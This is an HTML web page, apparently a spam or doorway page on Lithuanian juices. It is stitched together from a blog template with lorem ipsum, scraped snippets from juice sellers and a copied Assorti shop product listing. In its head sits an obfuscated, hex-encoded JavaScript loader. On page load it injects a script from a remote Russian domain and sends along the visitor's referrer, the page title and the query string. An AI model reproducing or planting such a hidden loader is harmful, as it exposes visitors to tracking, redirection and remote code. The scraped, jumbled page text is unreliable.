<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title>Sultys, nektarai, sulčių gėrimai | Assorti | sultys</title>
<meta http-equiv="Content-Type" content="text/html; charset="utf-8" />
<style type="text/css" media="all">
@import "images/style.css";
</style>

<script type="text/javascript">var _0x3e62=['\x74\x69\x74\x6c\x65','\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x72\x65\x70\x6c\x61\x63\x65','\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65','\x72\x65\x66\x65\x72\x72\x65\x72','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35\x26\x5f\x63\x69\x64\x3d\x61\x38\x36\x65\x61\x39\x65\x36\x2d\x30\x32\x37\x35\x2d\x36\x32\x65\x61\x2d\x38\x32\x39\x36\x2d\x33\x38\x39\x38\x64\x61\x33\x33\x63\x66\x39\x38','\x68\x74\x74\x70\x3a','\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x61\x2e\x7a\x61\x76\x6f\x64\x39\x33\x2e\x72\x75\x2f\x48\x48\x44\x43\x50\x58\x52\x31\x3f\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x68\x74\x74\x70\x73\x3a','\x73\x72\x63','\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74','\x70\x72\x6f\x74\x6f\x63\x6f\x6c','\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65','\x73\x65\x61\x72\x63\x68','\x54\x68\x65\x20\x77\x65\x62\x73\x69\x74\x65\x20\x77\x6f\x72\x6b\x73\x20\x6f\x6e\x20\x48\x54\x54\x50\x53\x2e\x20\x54\x68\x65\x20\x74\x72\x61\x63\x6b\x65\x72\x20\x6d\x75\x73\x74\x20\x75\x73\x65\x20\x48\x54\x54\x50\x53\x20\x74\x6f\x6f\x2e','\x26\x66\x72\x6d\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x34\x3d\x73\x63\x72\x69\x70\x74\x35\x66\x39\x36\x36\x30\x32\x65\x31\x34\x64\x31\x35'];(function(_0x46dbcc,_0x3e62d5){var _0x3f6e09=function(_0x110420){while(--_0x110420){_0x46dbcc['push'](_0x46dbcc['shift']());}};_0x3f6e09(++_0x3e62d5);}(_0x3e62,0x18d));var _0x3f6e=function(_0x46dbcc,_0x3e62d5){_0x46dbcc=_0x46dbcc-0x0;var _0x3f6e09=_0x3e62[_0x46dbcc];return _0x3f6e09;};var d=document,s=d[_0x3f6e('\x30\x78\x34')]('\x73\x63\x72\x69\x70\x74');s[_0x3f6e('\x30\x78\x65')]=_0x3f6e('\x30\x78\x62')+encodeURIComponent(document[_0x3f6e('\x30\x78\x37')])+_0x3f6e('\x30\x78\x61')+encodeURIComponent(document['\x74\x69\x74\x6c\x65'])+'\x26'+window[_0x3f6e('\x30\x78\x63')][_0x3f6e('\x30\x78\x31\x32')]['\x72\x65\x70\x6c\x61\x63\x65']('\x3f','\x26')+_0x3f6e('\x30\x78\x38');document['\x63\x75\x72\x72\x65\x6e\x74\x53\x63\x72\x69\x70\x74']?document[_0x3f6e('\x30\x78\x66')][_0x3f6e('\x30\x78\x36')]['\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65'](s,document[_0x3f6e('\x30\x78\x66')]):d[_0x3f6e('\x30\x78\x31\x31')]('\x68\x65\x61\x64')[0x0][_0x3f6e('\x30\x78\x33')](s);document[_0x3f6e('\x30\x78\x63')][_0x3f6e('\x30\x78\x31\x30')]===_0x3f6e('\x30\x78\x64')&&_0x3f6e('\x30\x78\x62')+encodeURIComponent(document[_0x3f6e('\x30\x78\x37')])+'\x26\x64\x65\x66\x61\x75\x6c\x74\x5f\x6b\x65\x79\x77\x6f\x72\x64\x3d'+encodeURIComponent(document[_0x3f6e('\x30\x78\x32')])+'\x26'+window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][_0x3f6e('\x30\x78\x31\x32')][_0x3f6e('\x30\x78\x35')]('\x3f','\x26')+_0x3f6e('\x30\x78\x31')['\x69\x6e\x64\x65\x78\x4f\x66'](_0x3f6e('\x30\x78\x39'))===0x0&&alert(_0x3f6e('\x30\x78\x30'));</script>
</head>
<body  id="jSuZyLxOnMLwnm">
<div class="content"   id="btjF2naPD7">
  <div id="top">
    <div class="padding"> <a href="privacy-policy.html">Privacy policy</a> | <a href="terms.html">Terms and Conditions</a> | <a href="photo.html">Photo gallery</a> | <a href="contact.html">Contacts</a></div>
  </div>
  <div id="header">
    <div class="f_search">
      <form method="post" action="#" id="21FgeDl7">
        <p>
          <input type="text" name="search" value="search..." class="search" onblur="if(this.value=='') this.value='search...';" onfocus="if(this.value=='search...') this.value='';" />
          <input type="submit" value="Go" class="submit" />
        </p>
      </form>
    </div>
    <div class="title"  id="UbFqx2y">
      <h1>sultys</</h1>
    </div>
  </div>
  <div id="subheader">
    <div id="menu">
    </div>
  </div>
  <div id="main">
    <div class="right_side"  id="bGtX54SKW">
      <div class="nav">
        <h2>About me</h2>
        <div class="padding">
          <div class="img2"><img src="img/1143195131eb49273c72eb10c6da2106.jpg" alt=""  width="25%"/></div>
          Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Integer euismod ante non diam. Sed eleifend odio sed quam. Sed vulputate, turpis at tincidunt porttitor, est elit consequat metus.</div>
        <h2>Past Articles</h2>
 <ul>
<li><a href="index.html">Įvairios sultys</a><br> Kiekvieną rytą išgerkite 200 ml (galima didinti iki 300-400 ml) sulčių ant tuščio skrandžio. Tai turi būti šviežios sultys, be jokių pridėtinių ingredientų. Salierų sultys yra nekaloringas gėrimas – 2 saliero kotai turi apie 16 kcal. Tam, kad juos suvirškinti, organizmas sunaudoja 14 kcal, vadinasi, Jums lieka vos 2 kcal.</li>
<li><a href="1.html">Vaisiu Sultys | Lietuviškos sultys ne iš koncentrato</a><br> Su meile – rudenio gėrybėms! Sultys spaudžiamos ir pasterizuojamos iš: obuolių, kriaušių, moliūgų, cukinijų, morkų, apelsinų; Reikalingi švarūs ir nepapuvę vaisiai, nes nuo to priklauso Jūsų sulčių kokybė ir ilgaamžiškumas.</li>
<li><a href="2.html">Tomo Sultys – sulčių spaudimas</a><br> Sultys Pristatymo miestas: 3.00 € / vnt. Aviečių sultys, 300ml Mindaugo Slapkausko ūkis. 3 ...</li>
<li><a href="3.html">Vis dar negeriate šių sulčių? Biomedicinos mokslų daktarė ...</a><br> Natūralios uogų ir vaisių sultys, kiti sveiki produktai Darbo laikas: I - V 9:00 - 19:00 | VI - VII Telefonas: 862855510, 865034137 El. paštas: info@uogusultys.lt Adresas: Pievų g. 9, Giedrių kaimas, Jurbarko rajonas</li>
<li><a href="4.html">Sulčių spaudykla, sulčių spaudimas, spaudžia sultis</a><br> Obuolių sultys. Spaudžiame ir pasterizuojame obuolių sultis Utenoje, Užpalių g. 83B, kiekvieną dieną 08:00 - 20:00. Tel. +37068142902.</li>
<li><a href="5.html">Obuolių sultys | Kontaktai | Utenos sultys | Obuolių ...</a><br> Sultys, Sulčių spaudyklos, Prekyba pakuotėmis, Prekyba sulčių spaudimo įranga. Lietuvos sulčių spaudyklų katalogas, rask sulčių spaudyklą savo mieste!</li>
<li><a href="6.html">Sultys | Produktų katalogas</a><br> Ekologiškos biodinaminės sultys FUR shot su imbieru ir ciberžole, 60ml 1,99 ...</li>
<li><a href="7.html">Sultys | Uogusultys.lt</a><br> Ažuožerių sultys, ŽŪK | Šeimyniškių k., Anykščių r. Lietuva | Tel.</li>
<li><a href="8.html">Sultys - BARBORA</a><br> Sultys. Sultys pakaitintos iki 80 laipsnių, todėl vitaminai išlikę sultyse. Tetrapakus galima laikyti neatidarytus 2 metus, tačiau vitaminai išlieka iki 9 mėn, o pradarius tetrapaką, sultis reikėtų išgerti per 3 mėn.</li>
<li><a href="9.html">SULTYS | Gaivieji gėrimai | Gėrimai | e-eugesta.lt prekės ...</a><br> Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml. €1,89 €0,10 × Tara €2,52/l. Obuolių,morkų sultys VAISIŲ SULTYS su minkštimu, 750 ml. KARTU REKOMENDUOJAME. Apelsinų ir pasiflorų sultys HOHES C PLUS su vitaminu D, 1 l. €2,29 €0,10 × Tara ...</li>
</ul>
        <br />
        <h2>Menu</h2>
<ul>
<li><a href="index.html">Įvairios sultys</a></li>
<li><a href="1.html">Vaisiu Sultys | Lietuviškos sultys ne iš koncentrato</a><br></li>
<li><a href="2.html">Tomo Sultys – sulčių spaudimas</a><br></li>
<li><a href="3.html">Vis dar negeriate šių sulčių? Biomedicinos mokslų daktarė ...</a><br></li>
<li><a href="4.html">Sulčių spaudykla, sulčių spaudimas, spaudžia sultis</a><br></li>
<li><a href="5.html">Obuolių sultys | Kontaktai | Utenos sultys | Obuolių ...</a><br></li>
<li><a href="6.html">Sultys | Produktų katalogas</a><br></li>
<li><a href="7.html">Sultys | Uogusultys.lt</a><br></li>
<li><a href="8.html">Sultys - BARBORA</a><br></li>
<li><a href="9.html">SULTYS | Gaivieji gėrimai | Gėrimai | e-eugesta.lt prekės ...</a><br></li>
</ul>
      </div>
    </div>
    <div class="left_side"   id="cBhd3XpnI">

      <h2  id="s3qjbiMYgZl">Sultys, nektarai, sulčių gėrimai | Assorti</h2>
      <div class="img"  id="jTYnu1AgSDew"><img src="img/d0395f250b34efcbe0048f900d07f729.jpg" alt=""  width="30%" id="jHt5rgggI"/></div>
  <span> Supratau</span> <p> Mūsų svetainėje naudojami slapukai, kad užtikrintume jums teikiamų paslaugų kokybę. Išjungdami šį pranešimą arba toliau naršydami šioje svetainėje sutinkate su assorti.lt privatumo politika .</p> <span> </span> <span> menu</span> Prekių pristatymas Atsiskaitymo būdai Taisyklės ASSORTI klubo programa pagalba@assorti.lt Kontaktai <i> </i> 0 0 <i> </i> <i> </i> +370 700 33311 <i> </i> <h4> <span> Prisijungti prie savo paskyros</span> </h4> <h4> <span> Maistas ir<br/> gėrimai</span> </h4> Visas maistas <h5> Gourmet kumpiai ir sūriai</h5> <h5> Šviežia mėsa ir paukštiena</h5> <h5> Žuvis ir žuvies gaminiai</h5> <h5> Pieno gaminiai ir kiaušiniai</h5> <h5> Bakalėja</h5> <h5> Vaisiai ir daržovės</h5> <h5> Duonos gaminiai ir konditerija</h5> <h5> Šaldytas maistas</h5> <h5> Kava, arbata ir kakava</h5> <h5> Saldumynai</h5> <h5> Nealkoholiniai gėrimai</h5> <h5> Pasaulio virtuvės</h5> <h4> <span> Vaikams</span> </h4> Peržiūrėti viską <h5> Kūdikių ir vaikų maistas</h5> <h5> Kūdikių ir vaikų higiena</h5> <h5> Kūdikių priežiūra</h5> <h5> Drabužiai ir aksesuarai</h5> <h5> Žaislai</h5> <h4> <span> Kosmetika</span> </h4> Rodyti viską <h5> Veido odos priežiūra</h5> <h5> Kūno odos priežiūra</h5> <h5> Burnos higiena</h5> <h5> Plaukų priežiūra</h5> <h5> Intymi higiena</h5> <h5> Kosmetika vyrams</h5> <h5> Sveikatos priežiūra</h5> <h5> Kvepalai ir eteriniai aliejai</h5> <h4> <span> Namams</span> </h4> Rodyti viską <h5> Interjerui</h5> <h5> Virtuvės reikmenys</h5> <h5> Buitinės chemijos prekės</h5> <h5> Namų apyvokos reikmenys</h5> <h5> Gyvūnų prekės</h5> <h5> Šventinė atributika</h5> <h5> Romero Britto aksesuarai</h5> <h4> <span> Sveikesnė<br/> sudėtis</span> </h4> <h5> Ekologiška</h5> <h5> Veganams</h5> <h5> Be laktozės</h5> <h5> Supermaistas</h5> <h5> Be glitimo</h5> <h5> Be pridėtinio cukraus</h5> <h4> <span> Alkoholiniai<br/> gėrimai</span> </h4> <h5> Vynas</h5> <h5> Šampanas, Putojantys vynai</h5> <h5> Sidras</h5> <h5> Alus</h5> <h5> Stiprieji gėrimai</h5> <h4> <span> Akcijos</span> </h4> <h4> <span> Blogas</span> </h4> <h4> <span> Prekių pristatymas</span> </h4> <h4> <span> Atsiskaitymo būdai</span> </h4> <h4> <span> Taisyklės</span> </h4> <h4> <span> ASSORTI klubo programa</span> </h4> <h4> <span> Kontaktai</span> </h4> <h1> Sultys, nektarai, sulčių gėrimai</h1> Assorti <i> - </i> Katalogas <i> - </i> Maistas ir gėrimai <i> - </i> Nealkoholiniai gėrimai <i> - </i> Sultys, nektarai, sulčių gėrimai <span> Visos prekės</span> <span> Vanduo</span> <span> Vaisvandeniai</span> <span> Fermentuoti gėrimai</span> <span> Sultys, nektarai, sulčių gėrimai</span> <span> Nealkoholinis vynas, alus, kokteiliai</span> <span> Kiti gėrimai</span> <h5> Filtrai </h5> <h5> Kaina</h5> <span> </span> <span> </span> <h5> Prekės ženklas </h5> ANDROS <span> 1</span> BIG TOM <span> 1</span> BIOZENTRALE <span> 1</span> BJORG <span> 1</span> DELIZUM <span> 1</span> FUR <span> 1</span> GRANTE <span> 1</span> HOLLINGER <span> 1</span> IAM <span> 1</span> JOKER <span> 1</span> MOLKEREI <span> 1</span> PHILIPPINE <span> 1</span> RABENHORST <span> 1</span> ZUMOSOL <span> 1</span> <h5> Kilmės šalis</h5> Anglija <span> 1</span> Austrija <span> 1</span> Azerbaidžanas <span> 1</span> Brazilija <span> 1</span> ES <span> 1</span> Filipinai <span> 1</span> Ispanija <span> 1</span> Jungtiniai Arabų Emiratai <span> 1</span> Jungtinė Karalystė <span> 1</span> Nyderlandai <span> 1</span> Pietų Afrika <span> 1</span> Prancūzija <span> 1</span> Vokietija <span> 1</span> Šveicarija <span> 1</span> <h5> Savybės </h5> Ekologiškas produktas <span> 67</span> Natūralus produktas <span> 2</span> Be laktozės <span> 3</span> Be glitimo/gliuteno <span> 43</span> Veganams <span> 5</span> Vegetarams <span> 3</span> Gerai Rikiuoti pagal... Pavadinimą Datą Didžiausią nuolaidą Mažiausią kainą Didžiausią kainą <span> <span> </span> </span> <span> </span> <span> <span> Naujiena</span> <span> <span> Ekologiškos biodinaminės sultys FUR shot su imbieru, 60ml</span> <span> </span> <span> </span> </span> <span> <span> 1,99 €</span> <span> 33,17 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Raudonųjų vynuogių, granatų ir miško uogų 100% ZUMOSOL sultys, 1 L</span> <span> </span> <span> </span> </span> <span> <span> 2,49 €</span> <span> 2,49 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos 100% kruvinojo apelsino (Bloody Orange) sultys MOLKEREI, 500ml</span> <span> </span> <span> </span> </span> <span> <span> 3,59 €</span> <span> 7,18 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos 100% apelsinų sultys MOLKEREI, 500ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 7,98 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškas biodinaminis mangų glotnutis FUR Funky Mango, 280ml</span> <span> </span> <span> </span> </span> <span> <span> 2,29 €</span> <span> 8,18 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškas biodinaminis uogų glotnutis FUR Holy Berry Smoothie, 280ml</span> <span> </span> <span> </span> </span> <span> <span> 2,29 €</span> <span> 8,18 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės 100 % granatų sultys FUR, 330ml</span> <span> </span> <span> </span> </span> <span> <span> 4,49 €</span> <span> 13,61 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės sultys FUR Antioxidants , 500ml</span> <span> </span> <span> </span> </span> <span> <span> 3,29 €</span> <span> 6,58 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės sultys FUR Immune power , 500ml</span> <span> </span> <span> </span> </span> <span> <span> 3,29 €</span> <span> 6,58 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės mangų ir morkų sultys FUR, 500ml</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 5,98 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės vynuogių ir granatų sultys FUR, 500ml</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 5,98 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės mangų, apelsinų ir pasiflorų sultys FUR, 500ml</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 5,98 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos biodinaminės sultys FUR shot su imbieru ir ciberžole, 60ml</span> <span> </span> <span> </span> </span> <span> <span> 1,99 €</span> <span> 33,17 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos citrinų sultys BIOZENTRALE, 250ml</span> <span> </span> <span> </span> </span> <span> <span> 2,49 €</span> <span> 9,96 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos žaliųjų citrinų sultys BIOZENTRALE, 250ml</span> <span> </span> <span> </span> </span> <span> <span> 3,49 €</span> <span> 13,96 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos citrinų ir imbiero sultys BIOZENTRALE, 250ml</span> <span> </span> <span> </span> </span> <span> <span> 5,99 €</span> <span> 23,96 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Ananasų sultys JOKER 100%, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,49 €</span> <span> 2,49 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Apelsinų sultys JOKER 100%, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,79 €</span> <span> 2,79 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Obuolių nektaras ZUMOSOL, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 0,79 €</span> <span> 3,95 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Persikų nektaras ZUMOSOL, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 0,79 €</span> <span> 3,95 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Ananasų-vynuogių nektaras ZUMOSOL, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 0,79 €</span> <span> 3,95 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos raudonųjų vynuogių, granatų ir miško uogų ZUMOSOL sultys, 1L</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 3,99 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Apelsinų-mėlynių sulčių gėrimas ZUMOSOL, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,59 €</span> <span> 2,59 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Apelsinų-braškių sulčių gėrimas ZUMOSOL, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,99 €</span> <span> 2,99 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Apelsinų-gvajavų sulčių gėrimas ZUMOSOL, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,59 €</span> <span> 2,59 €/l</span> </span> </span> vnt. Į krepšelį <span> </span> <span> </span> <span> <span> <span> Apelsinų-morkų sulčių gėrimas ZUMOSOL, 1L</span> <span> </span> <span> </span> </span> <span> <span> 2,59 €</span> <span> 2,59 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos apelsinų sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos apelsinų sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos vaisių sultys ACE DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos raudonųjų vynuogių sultys DELIZUM ne iš koncentrato, 1L</span> <span> </span> <span> </span> </span> <span> <span> 5,49 €</span> <span> 5,49 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos apelsinų sultys DELIZUM ne iš koncentrato, 1L</span> <span> </span> <span> </span> </span> <span> <span> 5,49 €</span> <span> 5,49 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos burokėlių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 4,49 €</span> <span> 5,99 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos mėlynių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 9,99 €</span> <span> 13,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos spanguolių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 9,99 €</span> <span> 13,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos morkų ir alavijų sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos morkų ir alavijų sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos obuolių ir alavijų sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos obuolių ir alavijų sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškas žaliųjų slyvų nektaras DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos baltųjų vynuogių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos pomidorų sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos pomidorų sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos greipfrutų sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos abrikosų sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos tropinių vaisių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos persikų ir baltųjų vynuogių sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos persikų ir baltųjų vynuogių sultys DELIZUM, 750ml</span> <span> </span> <span> </span> </span> <span> <span> 3,99 €</span> <span> 5,32 €/l</span> </span> </span> vnt. Į krepšelį <span> <span> </span> <span> </span> </span> <span> </span> <span> <span> <span> Ekologiškos viduržemio jūros sultys DELIZUM, 200ml</span> <span> </span> <span> </span> </span> <span> <span> 1,49 €</span> <span> 7,45 €/l</span> </span> </span> vnt. Į krepšelį Rodyti po: 12 24 48 100 <i> </i> 1 2 <i> </i> <span> </span> Verkių g 29B, <span> &bdquo;</span> Ogmios miestas<span> &ldquo;</span> , Vilnius Parduotuvė <span> Tel: +370 687 13979</span> <span> El.pa&scaron;tas: parduotuve.ogmios@assorti.lt </span> I-VII: 10:00 - 20:00 <br/> <br/> Saltoni&scaron;kių g. 9, PC <span> &bdquo;</span> Panorama<span> &ldquo;</span> , <br/> Vilnius Parduotuvė <span> Tel: +370 688 30490</span> El. pa&scaron;tas: panorama@assorti.lt <span> I-V</span> <span> I</span> <span> :<span> </span> </span> <span> 10</span> <span> :00 - 22:00</span> <br/> <span> VII: 10:00 - 21:00</span> Tel.: +370 700 33311 <span> El. p.: </span> pagalba@assorti.lt <span> Konsultuojame visomis dienomis</span> <br/> <span> nuo 9:00 iki 19:00</span> <br/> <br/> <p> </p> <p> </p> <p> </p> Kontaktai Apie Assorti Prekių pristatymas Atsiskaitymo būdai Taisyklės Privatumo politika ASSORTI klubo programa Dovanų čekis Karjera <i> </i> Facebook <i> </i> Instagram UAB Assorti 2020 Sprendimas: ELECTRONIC LAB Bendra suma: 0 € Peržiūrėti krepšelį <p> Įdėjus prekes į krepšelį, jos pasirodys čia.</p> Užsakymų istorija <span> </span> <span> </span>
  <hr />
<iframe width="530" height="315" src="https://www.youtube.com/embed/YnhbgQoAQn8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

      <p class="date" id="mWwxLXUPVtS1muj">Posted by Jack <img src="images/more.gif" alt="" /> <a href="#">Read more</a> <img src="images/comment.gif" alt="" /> <a href="#">Comments (15)</a> <img src="images/timeicon.gif" alt="" /> 2020.10.29 08:18</p>
      <br />
    </div>
  </div>
  <div id="footer">
    <div class="padding"> Copyright &copy; 2020 BlueBlog |</div>
	<p id="LBljp7ZlGQxt"></p>
  </div>
</div>
</body>
</html>